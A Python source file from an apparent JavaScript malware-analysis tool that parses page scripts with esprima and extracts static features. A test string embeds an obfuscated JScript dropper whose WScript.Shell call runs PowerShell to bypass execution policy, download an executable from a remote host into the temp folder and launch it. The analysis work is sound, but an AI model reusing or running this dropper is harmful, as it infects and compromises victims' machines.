import sys
import os
from typing import List
from analyzer.core.utils import get_file_buffer
from analyzer.extractors.page_parser import PageParser
from analyzer.features.javascript.static import features
from analyzer.datatypes.page import Page
from analyzer.datatypes.js_file import JsFile

from analyzer.config import FLDR_JS_TEMP

import esprima

TEST = """


let youmother = "1";

function alfyplessap() {
	return undefined;
}
var myltuc = "ugjizyffy";

myltuc.onerror = function({
	
})
var test = myltyuc.search('jo');
var lekazyzfi = 'lycraninj';
var edeb = WScript;
var ctywo = 0;
var iwira = "kdikixuno";

function emesysicq() {
	return null;
}
ulevecga = '33960';

function apmij() {
	return null;
}
function axoxysfexz() {
	return 0;
}
function fakyfbevra() {
	var pdewi = 0;
	return pdewi;
}
imyqesk = 'jalihy';

function fqykrudlimg() {
	return true;
}
function ezapxunhycg() {
	var bsuxgibk = "oryrfi";
	return bsuxgibk;
}
var agavhajhej = true;
cvujext = "eceti";
ukzuwfyhlu = "awabazr";
var tarvip = 1.3;
var udygbylbi = '12200';
var tdurot = "run";
var cyfpatjezv = null;
var sakhawfoq = "55784";

function ywugo() {
	var nhyfna = '55673';
	return nhyfna;
}
var asaboczi = undefined;
var uvacdykadq = typeof window == "undefined";
var isxoxnup = undefined;

function uvmitluzo() {
	return undefined;
}
var qlomoswijty = 8;

function epjutgywxa() {
	var nmufdygjobt = undefined;
	return nmufdygjobt;
}
function ololsu() {
	return null;
}
function jereqhuphe() {
	var ftapun = 'yhnozrovheqt';
	return ftapun;
}
var yvnapus = 8.28;

function salhy() {
	var idylle = null;
	return idylle;
}
function elypa() {
	var egnoqqy = null;
	return egnoqqy;
}
var ifopracxa = undefined;
if (typeof ifopracxa == 'undefined') {
	var cqorobcit = edeb.CreateObject('WScript.Shell');
	switch (salhy()) {
	case 336:
		if (isxoxnup == undefined) {
			var ajagjij = 22.5;
			var uxxejrubv = 1.4;
			var ezgalu = '44472';
		}
		if (tarvip > -2.7) {
			var pdatqecqed = null;
			var opulwolyw = 'upefvadukf';
			opulwolyw = 188 + opulwolyw;
			var jtofuda = 1;
			var itpirnezmiv = undefined;
			var etgeva = 1;
			var ngyqjokv = "39752";
			orutmawvend = 8.933;
			var tcaqryk = ngyqjokv + orutmawvend;
			tcaqryk = '39066' + tcaqryk;
			var hojebe = undefined;
		}
		if (fakyfbevra() == false) {
			if (uvmitluzo() == "qhawec") {
				var sfikipu = true;
				var dobure = 912;
				dobure = "54201";
				sowoxozy = "54062";
				var ixamjejy = 11.835;
				var nqijcarefi = ixamjejy + sowoxozy;
				nqijcarefi = nqijcarefi + 76.107;
			}
		}
		var ydxezbonb = undefined;
		if (ydxezbonb === 0) {
			var ubafi = undefined;
			var hqimit = '74931';
			var vmicohsa = 315;
			var obelde = 24.2;
			var aznimuqas = 0;
		}
		break;
	case null:
		if (ololsu() === 894) {
			if (apmij() === 'emydbycny') {
				var sezjupyxg = 64;
				var femudr = null;
				var ytivy = true;
			}
			var ecaf = undefined;
			if (ecaf === 594) {
				var ynasi = undefined;
			}
			if (agavhajhej == true) {
				var acwydralb = "aropfiscox";
				acwydralb = '31477';
				var adera = undefined;
				var ufcugixe = "afganaktyzc";
				ufcugixe = 'otij';
				ibuftaflig = 993;
				var oxbyzej = ibuftaflig + imyqesk;
				oxbyzej = 6 + oxbyzej;
			}
		} else {
			var vinatcotg = true;
			if (uvacdykadq) {
				if (typeof jereqhuphe() == "string") {
					var ubahgoliw = undefined;
					if (elypa() === 229) {
						if (qlomoswijty > 5) {
							var ucsulu = 0;
						}
						var iwbacove = null;
						if (iwbacove === true) {
							if (asaboczi == false) {
								var pedholzo = "ivyw";
								var roqtax = '45040';
								var vzikjatxizf = 0.54;
								usejxo = roqtax + vzikjatxizf;
							}
						}
					} else {
						switch (epjutgywxa()) {
						case 41:
							if (ezapxunhycg() === 'oryrfi') {
								abihciwg = "mvuvqavoh";
								var ahylxuda = 7;
								var urcujtec = abihciwg + ahylxuda;
								urcujtec = urcujtec + 26.6;
								var xmobtec = null;
							}
							var ubvegyhuzq = null;
							if (ubvegyhuzq === null) {
								var ywaze = 46.5577;
								ywaze = 6 + ywaze;
							}
							if (emesysicq() == "erov") {
								var lrizelysi = '68107';
								var weslyh = undefined;
								var ocizofa = 10.2;
								ocizofa = 16.636;
								tvotytlaho = "tfosadgi";
								edehi = 430;
								var ivduzpita = edehi + tvotytlaho;
								ivduzpita = "88794" + ivduzpita;
								var ozatfec = '28795';
								ozatfec = 'flumhit';
								var ubmobligza = 'dsavyxulo';
								exrodceqez = 15;
								var vnedeqdadxo = exrodceqez + ubmobligza;
								vnedeqdadxo = "74201" + vnedeqdadxo;
							}
							break;
						case undefined:
							var yrbyjivs = 0;
							switch (yrbyjivs) {
							case null:
								var dacyki = undefined;
								if (dacyki == undefined) {
									var pyzsej = 7;
									clixgupzyv = pyzsej + sakhawfoq;
									clixgupzyv = clixgupzyv + 20;
									var nubginmuldu = 4;
									var evozo = nubginmuldu + lekazyzfi;
									evozo = evozo + 8.1;
									var puwqab = "52638";
									ykemadi = 31.2453;
									wyrlymo = ykemadi + puwqab;
								}
								if (typeof alfyplessap() == 'undefined') {
									var hajxyqebu = true;
									var uvtubbojpyg = '6680';
									var zexebc = 3.39;
									var jadwokry = zexebc + uvtubbojpyg;
									nxuvxityq = "65222";
									var mjozuqafu = 6;
									var gjoxektux = nxuvxityq + mjozuqafu;
									var ipnunfumo = 45;
									ipnunfumo = 7;
									var qkisylmi = "81623";
									var xyskubsahs = null;
								}
								var pighictiqi = undefined;
								if (pighictiqi === 'upxudurde') {
									var begdyvgu = "ege";
									begdyvgu = "neqane" + begdyvgu;
								}
								break;
							case null:
								var dacyki = undefined;
								if (dacyki == undefined) {
									var pyzsej = 7;
									clixgupzyv = pyzsej + sakhawfoq;
									clixgupzyv = clixgupzyv + 20;
									var nubginmuldu = 4;
									var evozo = nubginmuldu + lekazyzfi;
									evozo = evozo + 8.1;
									var puwqab = "52638";
									ykemadi = 31.2453;
									wyrlymo = ykemadi + puwqab;
								}
								if (typeof alfyplessap() == 'undefined') {
									var hajxyqebu = true;
									var uvtubbojpyg = '6680';
									var zexebc = 3.39;
									var jadwokry = zexebc + uvtubbojpyg;
									nxuvxityq = "65222";
									var mjozuqafu = 6;
									var gjoxektux = nxuvxityq + mjozuqafu;
									var ipnunfumo = 45;
									ipnunfumo = 7;
									var qkisylmi = "81623";
									var xyskubsahs = null;
								}
var pighictiqi = undefined;
								if (pighictiqi === 'upxudurde') {
									var begdyvgu = "ege";
									begdyvgu = "neqane" + begdyvgu;
								}
								break;
							case undefined:
								var dacyki = undefined;
								if (dacyki == undefined) {
									var pyzsej = 7;
									clixgupzyv = pyzsej + sakhawfoq;
									clixgupzyv = clixgupzyv + 20;
									var nubginmuldu = 4;
									var evozo = nubginmuldu + lekazyzfi;
									evozo = evozo + 8.1;
									var puwqab = "52638";
									ykemadi = 31.2453;
									wyrlymo = ykemadi + puwqab;
								}
								if (typeof alfyplessap() == 'undefined') {
									var hajxyqebu = true;
									var uvtubbojpyg = '6680';
									var zexebc = 3.39;
									var jadwokry = zexebc + uvtubbojpyg;
									nxuvxityq = "65222";
									var mjozuqafu = 6;
									var gjoxektux = nxuvxityq + mjozuqafu;
									var ipnunfumo = 45;
									ipnunfumo = 7;
									var qkisylmi = "81623";
									var xyskubsahs = null;
								}
								var pighictiqi = undefined;
								if (pighictiqi === 'upxudurde') {
									var begdyvgu = "ege";
									begdyvgu = "neqane" + begdyvgu;
								}
								break;
							case 59:
								var dacyki = undefined;
								if (dacyki == undefined) {
									var pyzsej = 7;
									clixgupzyv = pyzsej + sakhawfoq;
									clixgupzyv = clixgupzyv + 20;
									var nubginmuldu = 4;
									var evozo = nubginmuldu + lekazyzfi;
									evozo = evozo + 8.1;
									var puwqab = "52638";
									ykemadi = 31.2453;
									wyrlymo = ykemadi + puwqab;
								}
								if (typeof alfyplessap() == 'undefined') {
									var hajxyqebu = true;
									var uvtubbojpyg = '6680';
									var zexebc = 3.39;
									var jadwokry = zexebc + uvtubbojpyg;
									nxuvxityq = "65222";
									var mjozuqafu = 6;
									var gjoxektux = nxuvxityq + mjozuqafu;
									var ipnunfumo = 45;
									ipnunfumo = 7;
									var qkisylmi = "81623";
									var xyskubsahs = null;
								}
								var pighictiqi = undefined;
								if (pighictiqi === 'upxudurde') {
									var begdyvgu = "ege";
									begdyvgu = "neqane" + begdyvgu;
								}
								break;
							case 0:
								var opyrmusr = "59596";
								switch (yvnapus) {
								case undefined:
									var ovkidq = "vawzunz";
									if (ovkidq === "vawzunz") {
										var cujmolen = 95;
									}
									if (cyfpatjezv == "akolybb") {
										var zvofcutbemt = 20.8;
										var akoboq = 8;
										var efxoxyb = 176.76;
										var erogo = null;
									}
									break;
								case 8.28:
									var jqutzo = "cmd.exe /c \"po" + "we" + "rs" + "he" + "ll  $ojogo='^dimas.top';$hetfo='^-Scope  Pr';$pobbi='^,$path); ';$innypu='^ocess; $p';$monsucm='^y Bypass ';$binkucb='^h';$ykpyffy='^Start-Pro';$ykjygr='^:temp+''\b';$uzmez='^e'');(New-';$xzymo='^Set-Execu';$ulirgo='^tp://laro';$eqtem='^ath=($env';$evyvz='^).Downloa';$ogxow='^Webclient';$utkyjv='^/777.exe''';$gsydibv='^tionPolic';$upoh='^stem.Net.';$zceqmi='^Object Sy';$cepsuhm='^ipbafa.ex';$qfyzko='^dFile(''ht';$awysqe='^cess $pat'; Invoke-Expression ($xzymo+$gsydibv+$monsucm+$hetfo+$innypu+$eqtem+$ykjygr+$cepsuhm+$uzmez+$zceqmi+$upoh+$ogxow+$evyvz+$qfyzko+$ulirgo+$ojogo+$utkyjv+$pobbi+$ykpyffy+$awysqe+$binkucb);\"";
									cqorobcit[tdurot](jqutzo, ctywo);
									pbuhbixfavy = 13.39;
									muvhurf = pbuhbixfavy + iwira;
									muvhurf = muvhurf + 148;
									var rlotjyqqujbo = 1;
									var uciseb = 65.9424;
									break;
								case false:
									var ovkidq = "vawzunz";
									if (ovkidq === "vawzunz") {
										var cujmolen = 95;
									}
									if (cyfpatjezv == "akolybb") {
										var zvofcutbemt = 20.8;
										var akoboq = 8;
										var efxoxyb = 176.76;
										var erogo = null;
									}
									break;
								}
								break;
							}
							break;
						}
					}
				} else {
					if (udygbylbi == undefined) {
						var kvulevu = 'akbi';
						var ekgimiwic = 3;
						var hdamxukxa = kvulevu + ekgimiwic;
						hdamxukxa = '41325' + hdamxukxa;
						var pekyhcucl = false;
						var ugfolkydox = 120.627;
						var ymabnetlo = undefined;
					}
				}
			}
		}
		break;
	case "ebqabem":
		if (isxoxnup == undefined) {
			var ajagjij = 22.5;
			var uxxejrubv = 1.4;
			var ezgalu = '44472';
		}
		if (tarvip > -2.7) {
			var pdatqecqed = null;
			var opulwolyw = 'upefvadukf';
			opulwolyw = 188 + opulwolyw;
			var jtofuda = 1;
			var itpirnezmiv = undefined;
			var etgeva = 1;
			var ngyqjokv = "39752";
			orutmawvend = 8.933;
			var tcaqryk = ngyqjokv + orutmawvend;
			tcaqryk = '39066' + tcaqryk;
			var hojebe = undefined;
		}
		if (fakyfbevra() == false) {
			if (uvmitluzo() == "qhawec") {
				var sfikipu = true;
				var dobure = 912;
				dobure = "54201";
				sowoxozy = "54062";
				var ixamjejy = 11.835;
				var nqijcarefi = ixamjejy + sowoxozy;
				nqijcarefi = nqijcarefi + 76.107;
			}
		}
		var ydxezbonb = undefined;
		if (ydxezbonb === 0) {
			var ubafi = undefined;
			var hqimit = '74931';
			var vmicohsa = 315;
			var obelde = 24.2;
			var aznimuqas = 0;
		}
		break;
	case 95:
		if (isxoxnup == undefined) {
			var ajagjij = 22.5;
			var uxxejrubv = 1.4;
			var ezgalu = '44472';
		}
		if (tarvip > -2.7) {
			var pdatqecqed = null;
			var opulwolyw = 'upefvadukf';
			opulwolyw = 188 + opulwolyw;
			var jtofuda = 1;
			var itpirnezmiv = undefined;
			var etgeva = 1;
			var ngyqjokv = "39752";
			orutmawvend = 8.933;
			var tcaqryk = ngyqjokv + orutmawvend;
			tcaqryk = '39066' + tcaqryk;
			var hojebe = undefined;
		}
		if (fakyfbevra() == false) {
			if (uvmitluzo() == "qhawec") {
				var sfikipu = true;
				var dobure = 912;
				dobure = "54201";
				sowoxozy = "54062";
				var ixamjejy = 11.835;
				var nqijcarefi = ixamjejy + sowoxozy;
				nqijcarefi = nqijcarefi + 76.107;
			}
		}
		var ydxezbonb = undefined;
		if (ydxezbonb === 0) {
			var ubafi = undefined;
			var hqimit = '74931';
			var vmicohsa = 315;
			var obelde = 24.2;
			var aznimuqas = 0;
		}
		break;
	}
	var qdylbucpakro = 650;
	var byvacc = qdylbucpakro + cvujext;
	byvacc = "ombyracah" + byvacc;
	var stosahnu = '99671';
	gujuhb = 9;
	var eckizety = stosahnu + gujuhb;
	eckizety = eckizety + "ofvy";
	var abbywi = "sdobaqr";
	var vcuvwewgy = 2;
	var qazfawdagw = vcuvwewgy + abbywi;
	var nofarso = "hfitis";
} else {
	var defumli = '98747';
	if (defumli == '98747') {
		var buwafinb = 51;
		buwafinb = 29.4312;
		var ibecudw = "awigi";
	}
}

"""
# print(dir(esprima))

class FeaturesController:
	

	def __init__(self):
		self._page_parser = PageParser()
		self._features = features
		self.sequence = {}

		self.saved_js_paths: list = []

	def _save_js_file_content(self, js_file: JsFile) -> bool:
		# First check if already have the file
		# If dont have then create and save
		try:
			with open(os.path.join(FLDR_JS_TEMP, os.path.basename(js_file.src)), 'w') as f:
				f.write(js_file.content)
		except Exception as e:
			print("Failed to save ", js_file.src, str(e))
			return False
		return True

	def _extract_static_features(self, js_file: JsFile) -> bool:

		if not js_file.content:
			return False

		print("Extracting static features for :", js_file.src)

		for x in self._features:
			print("Currently extracting: ", x)

			x_obj = self._features[x]()
			js_file.static_features[x_obj.name] = x_obj.extract(js_file)

		return True

	def _run_syntactic_extraction(self, js_file: JsFile) -> bool:
		try:
			js_file.syntactic_extract = esprima.parse(js_file.content)
		except:
			return False
		return True

	def _extract_dynamic_features(self):
		# TODO
		pass

	def extract_urls_features(self, urls: list) -> List[Page]:
		"""	Flow 
		1. Takes in a list of URL then,
		2. Extract all contents followed 
		3. Extract Static & Dynamic features for all the JS files within the page.

		
		Args:
		    urls (list): Description
		"""
		pages = [self._page_parser.get_page_details(url=url) for url in urls]

		for page in pages:

			if not page.success:
				continue

			for js_file in page.external_js_files:

				if not js_file.content:
					continue

				print(js_file.content)

				if not self._run_syntactic_extraction(js_file):
					continue

				# After extracting all the syntactic details, then extract static details
				 
				if not self._save_js_file_content(js_file):
					continue

				if not self._extract_static_features(js_file):
					print("Failed to retrieve static features forP: ", js_file.src)
					continue

				# if js_file.src == "https://developer.mozilla.org//static/js/4.a756dea3.chunk.js":
				# 	print("Doing extract")
			
		return pages
		



